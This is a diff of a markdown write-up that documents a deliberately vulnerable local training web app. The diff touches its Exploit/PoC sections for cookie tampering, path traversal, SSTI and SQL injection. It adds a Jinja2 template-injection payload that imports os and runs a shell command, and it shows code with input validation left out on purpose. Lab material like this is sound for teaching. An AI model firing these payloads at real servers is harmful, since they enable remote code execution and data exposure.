@@ -82,7 +82,7 @@ Vulnerable code:
 cookie = request.cookies.get('user_id') #<--значение cookie не проверяется
 ```
 
-## Path traversal
+## Path traversal / Local File Inclusion
 Exploit/PoC:
 ```
 1. Open view-source http://localhost:8888/path_travers
@@ -98,13 +98,14 @@ Vulnerable code:
 image_path = f"{root_folder()}{file_path}" # --> dangerous command root_folder() and get user {file_path} input without validation
 ```
 
-## SSTI 
+## SSTI + RCE
 Exploit/PoC:
 ```
 Go to: http://localhost:8888/ssti
 Try payload:
 ?param={{(9*9)}}
 ?param={{%20config.items()%20}}
+?param={{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
 Vulnerable code:
@@ -178,7 +179,7 @@ elif request.method == 'POST':
   url = request.form.get('url') #<--user input without proper validation
 ```
 
-## SQl injection
+## SQL injection
 Exploit/PoC:
 ```
 Got to root '/' (logout if nessesary)
